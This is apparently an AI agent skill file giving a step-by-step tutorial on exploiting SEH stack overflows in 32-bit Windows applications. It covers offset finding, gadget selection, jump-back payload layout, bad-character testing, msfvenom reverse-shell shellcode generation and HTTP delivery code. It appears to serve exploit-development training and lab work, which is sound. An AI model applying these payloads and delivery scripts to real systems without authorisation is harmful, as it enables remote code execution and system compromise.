---
name: windows-seh-exploit
description: How to exploit Windows SEH-based stack overflows in 32-bit processes. Use this skill whenever the user mentions SEH overflow, structured exception handler exploitation, Windows x86 buffer overflow, nSEH/SEH overwrites, or needs to craft an exploit for a 32-bit Windows application with SEH chain corruption. This skill covers finding exact offsets, selecting POP POP RET gadgets, implementing jump-back techniques, handling bad characters, and delivering payloads over HTTP.
---

# Windows SEH Stack Overflow Exploitation

This skill guides you through exploiting Structured Exception Handler (SEH) overwrites in 32-bit Windows applications. SEH-based exploitation abuses the exception handler chain stored on the stack to redirect execution flow.

## Core Concept

When a stack buffer overflow overwrites the SEH chain, you control two 4-byte fields:

- **nSEH** (next SEH): Pointer to the next SEH record
- **SEH**: Pointer to the exception handler function

The exploitation flow:
1. Set SEH to a `POP POP RET` gadget address in a non-protected module
2. Use nSEH to redirect execution back into your shellcode buffer
3. Trigger an exception to dispatch to your controlled handler

## Step 1: Find Exact Offsets (nSEH / SEH)

First, determine where nSEH and SEH are overwritten in your payload.

### Generate a cyclic pattern

```bash
# Using Metasploit pattern_create
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000

# Or using pwntools
python3 -c "from pwn import *; print(cyclic(1000).decode())"
```

### Calculate offsets after crash

After crashing the target and noting the 32-bit values from the SEH view:

```bash
# Calculate nSEH offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x32424163

# Calculate SEH offset (typically nSEH + 4)
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x41484241
```

**Use the script**: `scripts/calc_offsets.py` to automate offset calculation.

### Validate offsets

Place markers at calculated positions to confirm:

```python
# Example: nSEH at 660, SEH at 664
payload = b"A" * 660 + b"BB" + b"CC" + b"D" * 336
```

Keep total length constant for reproducible crashes.

## Step 2: Choose a POP POP RET Gadget

You need a `POP POP RET` sequence to unwind the SEH frame and return into your nSEH bytes.

### Finding gadgets

**Using x64dbg with ERC.Xdbg plugin:**
```
ERC --SEH
```

**Using Mona (Immunity/WinDbg):**
```
!mona modules
!mona seh -m modulename
```

### Selection criteria

- Module must NOT have SafeSEH enabled
- Module should NOT have ASLR (or find a non-randomized base)
- Address must contain no bad characters when written little-endian
- Prefer gadgets in the vulnerable binary itself if protections allow

**Example valid address**: `0x004094D8` (verify no badchars: `p32(0x004094D8)`)

## Step 3: Implement Jump-Back Technique

nSEH is only 4 bytes, limiting you to a 2-byte short jump (`EB xx`) plus padding. For jumps back hundreds of bytes, chain a 5-byte near jump.

### Assemble jumps with nasmshell

```text
nasm> jmp -660           ; Too far for short jump
E967FDFFFF              ; 5-byte near jmp

nasm> jmp short -8       ; 2-byte short jmp fits in nSEH
EBF6

nasm> jmp -652           ; Adjusted for short-jmp hop
E96FFDFFFF
```

### Payload layout

```python
buffer_length = 1000
nseh_offset = 660
seh_offset = 664

payload  = b"\x90" * 50 + shellcode                    # NOP sled + shellcode
payload += b"A" * (nseh_offset - 8 - len(payload))     # Pad to 8 bytes before nSEH
payload += b"\xE9\x6F\xFD\xFF\xFF" + b"EEE"            # Near jmp -652 (5B) + 3B pad
payload += b"\xEB\xF6" + b"BB"                         # nSEH: short jmp -8 + 2B pad
payload += p32(0x004094D8)                             # SEH: POP POP RET
payload += b"D" * (buffer_length - len(payload))       # Padding
```

**Use the script**: `scripts/build_seh_payload.py` to construct payloads automatically.

### Execution flow

1. Exception occurs, dispatcher uses overwritten SEH
2. `POP POP RET` unwinds into your nSEH
3. nSEH executes `jmp short -8` into the 5-byte near jump
4. Near jump lands at buffer start where NOP sled + shellcode reside

## Step 4: Identify Bad Characters

Build a full badchar string and compare stack memory after crash to find mangled bytes.

### Generate badchar test payload

```python
badchars = bytes([x for x in range(1, 256)])
payload = b"A" * 660 + b"BBBB" + b"CCCC" + badchars
```

### Common bad characters

- HTTP-based: `\x00\x0a\x0d` (NUL, LF, CR) - almost always excluded
- C-string based: `\x00` (NUL terminator)
- Binary protocols: Varies by parser

**Use the script**: `scripts/find_badchars.py` to generate test payloads.

## Step 5: Generate Shellcode

Use msfvenom with your identified bad characters. Include a NOP sled for landing tolerance.

### Python format (for embedding)

```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp \
  LHOST=<LHOST> LPORT=<LPORT> \
  -b "\x00\x0a\x0d" -f python -v sc
```

### Hex format (for direct embedding)

```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp \
  LHOST=<LHOST> LPORT=<LPORT> \
  -b "\x00\x0a\x0d" -f hex
```

## Step 6: Deliver Over HTTP

When the vulnerable vector is HTTP, craft raw requests with exact CRLF handling.

**Use the script**: `scripts/craft_http_request.py` for proper HTTP payload delivery.

### Manual construction

```python
from pwn import remote

host, port = "<TARGET_IP>", 8080
body = b"A" * 1000  # Replace with SEH-aware payload

req = f"""POST / HTTP/1.1
Host: {host}:{port}
User-Agent: curl/8.5.0
Accept: */*
Content-Length: {len(body)}
Connection: close

""".replace('\n', '\r\n').encode() + body

p = remote(host, port)
p.send(req)
print(p.recvall(timeout=0.5))
p.close()
```

## Tooling Reference

| Tool | Purpose |
|------|--------|
| x32dbg/x64dbg | Observe SEH chain, triage crashes |
| ERC.Xdbg | Enumerate SEH gadgets (`ERC --SEH`) |
| Mona.py | Alternative gadget search (`!mona seh`) |
| nasmshell | Assemble short/near jumps |
| pwntools | Craft network payloads |
| msfvenom | Generate shellcode |

## Important Caveats

- **x86 only**: This technique applies only to 32-bit processes. x64 uses a different SEH scheme.
- **Module selection**: Prefer gadgets in modules without SafeSEH and ASLR.
- **Service watchdogs**: Can make iterative development easier by auto-restarting crashed services.
- **Modern protections**: DEP, ASLR, SafeSEH, and CFG significantly reduce SEH exploit viability.

## References

- [HTB: Rainbow – SEH overflow to RCE over HTTP](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [ERC.Xdbg – Exploit Research Plugin](https://github.com/Andy53/ERC.Xdbg)
- [Corelan – Exploit writing tutorial part 7 (SEH)](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-7-unicode-0day-buffer-overflow-seh-and-venetian-shellcode/)
- [Mona.py – WinDbg/Immunity helper](https://github.com/corelan/mona)
